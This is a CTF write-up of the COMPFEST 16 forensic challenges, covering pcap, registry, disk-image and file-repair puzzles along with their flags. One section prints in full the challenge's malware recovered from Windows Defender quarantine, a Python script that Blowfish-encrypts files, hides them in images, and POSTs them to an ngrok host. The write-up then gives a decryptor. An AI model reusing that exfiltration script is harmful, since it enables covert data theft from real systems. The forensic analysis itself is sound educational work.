---
title: "COMPFEST 16 CTF 2024 Qual & Final - Forensic Writeup"
pubDate: "2025-01-08"
description: 'All Forensic Write Up on COMPFEST 16 CTF 2024'
---
<div style="text-align: center;">
    <img src="https://hackmd.io/_uploads/r104F_iLkl.png" alt="image" width="250" />
</div>

On October 6th, 2024, we played in the final of COMPFEST 16 and were gratefully crowned as the champions.

# Qualification
Qualification starts at August 31st, 2024. I solved 4/4 Forensic challs.

<img src="https://hackmd.io/_uploads/Hy8n9OjIJe.png)" alt="image" width="250">

## Industrial Spy 3

```
from pwn import *
import struct

p = remote('challenges.ctf.compfest.id', 9009)
p.recv()

ans = [
    '22,5432',
    'server:changeme',
    'cafecoagroindustrialdelpacfico',
    'penalties',
    'Lyubov Pryadko'
]

for i in ans:
    p.sendline(i.encode())
    print(p.recv())
```

```
PS C:\1Jonathan\CTFS\Compfest\Quals\SIAK-OG\> & "C:/Users/M S
I/AppData/Local/Microsoft/WindowsApps/python3.12.exe"
c:/1Jonathan/CTFS/Compfest/Quals/industrialspy/ans.py

[x] Opening connection to challenges.ctf.compfest.id on port 9009

[x] Opening connection to challenges.ctf.compfest.id on port 9009:
Trying 35.197.140.85

[+] Opening connection to challenges.ctf.compfest.id on port 9009:
Done

b'2. What is the credentials used to access the database? (ex:
root:root)'

b'3. What is the password for the "super" user on the database?"

b'4. What table does the attacker modify?'

b'5. It seems that the attacker has modified their own data, what is
their full name?'

b\'Thank you for submitting your report. We will review it and get
back to you as soon as
possible.COMPFEST16{h3lla_ez_DF1R_t4sK_f0r_4n_1nt3rN_b96818fd79}'

Closed connection to challenges.ctf.compfest.id port 9009
```

1: open port?

```
from scapy.all import rdpcap, IP, TCP
def find_open_ports(pcap_file):
pcap = rdpcap(pcap_file)
open_ports = set()

for packet in pcap:
    if IP in packet and TCP in packet:
        if packet[TCP].flags == "SA": # SYN-ACK indicates an open port
            open_ports.add(packet[TCP].sport)
        return sorted(open_ports)

if __name__ == "__main__":
    pcap_file = "capture.pcapng" # Replace with your actual file path
    open_ports = find_open_ports(pcap_file)
    print(f"Open ports on the attacked machine: {', '.join(map(str,
    open_ports))}")
```

2: creds?

![image](https://hackmd.io/_uploads/HklTzOoLJe.png)


At stream 1215, server:changeme

3: password?

![image](https://hackmd.io/_uploads/ryaTfdoIyx.png)


Stream 1216, hashed pwd

![image](https://hackmd.io/_uploads/H12RzOiLJl.png)


4: modified table?

![image](https://hackmd.io/_uploads/BJ2kXdiLJe.png)


Still at 1216

5: fullname?

User id 6

![image](https://hackmd.io/_uploads/SyVxXOsLke.png)


## Dumb Hacker

From the registry file, it is directly visible in the user's recent. There are 2 part flags. Because the contents are hex encoded, I tried encoding "}" to hex "7d" and then did some more work, and found part 3.

![image](https://hackmd.io/_uploads/SyJZXdiL1x.png)

![image](https://hackmd.io/_uploads/ry2Wm_oIJe.png)


`COMPFEST16{y0u_gOt_h4cK3d_bY_a_sm00thcr1m1nal_148d87df4f}`

## Loss

This is very simple, the file that is given the .e01 file, just parse it using autopsy and find many deleted git files. Therefore, try checking others and find the files from the Recycle Bin folder

![image](https://hackmd.io/_uploads/Bkk7mui8yl.png)


## Heads up

Part 1 is directly visible in the file (rename to .zip because the header is PK)

Part 2 has an appended image, it looks like there is an IEND chunk, just need to fix it a bit

89 50 4E 47 0D 0A 1A 0A <- this is fixed

4D 4D 45 4F 4E 47 1A 0A <- this is the real one, the pattern is visible (it ended with 1A 0A and also has png chunks)

![image](https://hackmd.io/_uploads/B1_7Q_sIkg.png)


Part 3, after chunk iend png is a ttf font file.

the ttf also apparently only need to be extracted from the 'file'.

start from .IMG header

`00 01 00 00 00 10 01 00 00 03 00 60 44 53 49 47`

.IMG changed to something like that, i knew it after i compared it to another ttf font file.

still error, but can be opened using Microsoft Visual True Type, from there
can be saved as a font file so that the font can be installed

Open using visual truetype then export as font. I use notepad set the font to meong then open meong.txt. author says that it might be not rendered (so it is defective) just guess it a little bit.

![image](https://hackmd.io/_uploads/B1LEXdiIke.png)

![image](https://hackmd.io/_uploads/HyREXOiUkx.png)

`COMPFEST16{lO0kS_l1k3_u_k3Pt_Ur_hE4D_uP!_22a4b9bdf7}`


# Final
The final competition was held on October 6th, 2024, at Building A, Faculty of Computer Science, University of Indonesia. I was able to solve all 2/2 Forensic Challenge and were grateful to secure the champion title with my team.

## Forensic/Investigator

When parsing using autopsy, I immediately tried to find the recent command line that was running (because the chall description stated this was an attack)
Malicious.bat was found
![image](https://hackmd.io/_uploads/B14WCPiLJe.png)

When reading the program from malicious.bat, it was found that bat rms a .png file and there is a description of a .pkl file. When I tried to find the file, it was found in Windows/Recents/AutomaticDestinations

(https://www.reddit.com/r/csharp/comments/tcesr4/the_folder/)

The file is a pickled python file, which we can recover the image file

![image](https://hackmd.io/_uploads/Hk4f0DjLkl.png)

Parser:

```
import ast
from PIL import Image
import math


with open('data.pkl', 'r') as file:
    data = file.read()


data = ast.literal_eval(data)


num_pixels = len(data)
side_length = math.ceil(math.sqrt(num_pixels))
img = Image.new('RGBA', (side_length, side_length))


if len(data) < side_length * side_length:
    data += [(0, 0, 0, 0)] * (side_length * side_length - len(data))  # Padding with transparent pixels


img.putdata(data)
img.save('output_image_1to1.png')


# Show the image (optional)
img.show()
```

![image](https://hackmd.io/_uploads/B1qQ0woIyl.png)

Look at the event log file and it is known that the .bat previously saved an SfuSKla file
![image](https://hackmd.io/_uploads/rk5NAvoIkg.png)

We just need to look for the SfuSKla file in the hash_file in the dist

`COMPFEST16{mR._H4mmz1e_s4iD_p3Ac3_0uTt!_15fe393802}`

## Forensic/Bleu de fender

The title of the challenge suggests “DEFENDER” the context I realized was Windows Defender.

Sure enough there were quarantined artifacts in the WinDef program folder.
![image](https://hackmd.io/_uploads/HJXPRwoIyg.png)

Documentation:

https://blog.fox-it.com/2023/12/14/reverse-reveal-recover-windows-defender-quarantine-forensics/ 

![image](https://hackmd.io/_uploads/ryTdAPjI1e.png)

https://github.com/zam89/Windows-Defender-Quarantine-File-Decryptor 

Decrypted Malware:
```
import zlib; import base64; import requests; import random; import string; import os; import getpass; import sys; from io import BytesIO; from Crypto.Cipher import Blowfish; from Crypto.Util.Padding import pad; from PIL import Image;
IMG = "base64 of decompressed zlib data" #< tak hapus biar wu ga kepanjangan
count = 0; paths = sorted([''.join(random.choices(string.ascii_letters, k=8)) for _ in range(len(os.listdir(sys.argv[1])))])
for file in sorted(os.listdir(sys.argv[1])):
    with open(sys.argv[1] + "/" + file, "rb") as f: binary = f.read(); binary = Blowfish.new(getpass.getuser().encode(), Blowfish.MODE_CBC, iv=base64.b64decode("a3JpcHRvZGQ=")).encrypt(pad(binary, Blowfish.block_size)); img = Image.open(BytesIO(zlib.decompress(base64.b64decode(IMG))));pixels = img.load();countf=0;bit_string = ''.join(f'{b:08b}' for b in binary);assert len(bit_string) < img.height * img.width * 3;prev='0'
    for y in range(img.height):
        for x in range(img.width):
            r, g, b, a = pixels[x,y]
            new_r = (r & 0xFE) | int(bit_string[countf]) if countf < len(bit_string) else r; new_g = (g & 0xFE) | int(bit_string[countf + 1]) if countf + 1 < len(bit_string) else g; new_b = (b & 0xFE) | int(bit_string[countf + 2]) if countf + 2 < len(bit_string) else b
            pixels[x,y] = (new_r, new_g, new_b); countf += 3
    new = BytesIO(); img.save(new, format="PNG"); new.seek(0); new = new.read(); requests.post(f"http://c541-103-129-16-195.ngrok-free.app/{paths[count]}", data=new);count+=1
```

`username: adminganteng`

Let's just tidy it up:

```
#!/usr/bin/env python3

import zlib
import base64
import requests
import random
import string
import os
import getpass
import sys
from io import BytesIO
from Cryptodome.Cipher import Blowfish
from Cryptodome.Util.Padding import pad
from PIL import Image

IMG = "...(panjang bet)"
count = 0
paths = sorted(
    [
        "".join(random.choices(string.ascii_letters, k=8))
        for _ in range(len(os.listdir(sys.argv[1])))
    ]
)

for file in sorted(os.listdir(sys.argv[1])):
    with open(sys.argv[1] + "/" + file, "rb") as f:
        binary = f.read()
        binary = Blowfish.new(
            getpass.getuser().encode(),
            Blowfish.MODE_CBC,
            iv=base64.b64decode("a3JpcHRvZGQ="), # the base64 encoded string is kriptodd
        ).encrypt(pad(binary, Blowfish.block_size))
        img = Image.open(BytesIO(zlib.decompress(base64.b64decode(IMG))))
        pixels = img.load()
        countf = 0
        bit_string = "".join(f"{b:08b}" for b in binary)
        assert len(bit_string) < img.height * img.width * 3
        prev = "0"

    for y in range(img.height):
        for x in range(img.width):
            r, g, b, a = pixels[x, y]
            new_r = (
                (r & 0xFE) | int(bit_string[countf]) if countf < len(bit_string) else r
            )
            new_g = (
                (g & 0xFE) | int(bit_string[countf + 1])
                if countf + 1 < len(bit_string)
                else g
            )
            new_b = (
                (b & 0xFE) | int(bit_string[countf + 2])
                if countf + 2 < len(bit_string)
                else b
            )
            pixels[x, y] = (new_r, new_g, new_b)
            countf += 3

    new = BytesIO()
    img.save(new, format="PNG")
    new.seek(0)
    new = new.read()
    requests.post(f"http://c541-103-129-16-195.ngrok-free.app/{paths[count]}", data=new)
    count += 1
```

Encrypt data using blowfish -> lsb to target image -> send to network

Above is how the malware works.

The key used is the PC username, you can see it in the decrypted entry of Windows Defender that is not ss above (‘adminganteng’)

The file sent can be checked in pcap

This file is encrypted, right…

![image](https://hackmd.io/_uploads/HJzcAviUJe.png)

The encryption process uses Blowfish mode CBC with PKCS7 padding. The username and key are "adminganteng", and the IV (Initialization Vector) is "a3JpcHRvZGQ=", which if decoded with base64 is 'kriptodd'. Let's just make the decryptor:

```
#!/usr/bin/env python3

import base64
import os

from Cryptodome.Cipher import Blowfish
from Cryptodome.Util.Padding import unpad
from PIL import Image

# Define the IV based on the encryption script
iv = base64.b64decode("a3JpcHRvZGQ=")  # Decodes to b'kriptodd'

# The key is the username used during encryption.
key = 'adminganteng'.encode()  # Using the provided username as the key

input_folder = 'enc_images'    # Folder containing the encrypted images
output_folder = 'dec_files'    # Folder to save the decrypted files

if not os.path.exists(output_folder):
    os.makedirs(output_folder)

for index, image_file in enumerate(sorted(os.listdir(input_folder))):
    image_path = os.path.join(input_folder, image_file)
    img = Image.open(image_path)
    pixels = img.load()
    width, height = img.size
    bits = ''
    bytes_list = []
    found = False  # Flag to indicate successful decryption

    for y in range(height):
        if found:
            break  # Exit outer loop if decryption is successful
        for x in range(width):
            r, g, b, *rest = pixels[x, y]
            bits += str(r & 1)
            bits += str(g & 1)
            bits += str(b & 1)

            # Every 8 bits, convert to a byte
            while len(bits) >= 8:
                byte_bits = bits[:8]
                bits = bits[8:]
                byte = int(byte_bits, 2)
                bytes_list.append(byte)

                # Check if we have enough bytes (multiple of block size)
                if len(bytes_list) % Blowfish.block_size == 0:
                    # Attempt to decrypt with the current data
                    encrypted_data = bytes(bytes_list)
                    cipher = Blowfish.new(key, Blowfish.MODE_CBC, iv)
                    try:
                        decrypted_data = cipher.decrypt(encrypted_data)
                    except ValueError:
                        pass
            if found:
                break

    # Save the decrypted data
    output_file = os.path.join(output_folder, f'decrypted_file_{index}.png')
    with open(output_file, 'wb') as f:
        f.write(decrypted_data)
    print(f"Processed {image_file} to {output_file}")
```

![image](https://hackmd.io/_uploads/ByXsAwiL1x.png)


`COMPFEST16{1mAg3_4S_4ppL1cAt10N_l4YeR_b678cc834b}`
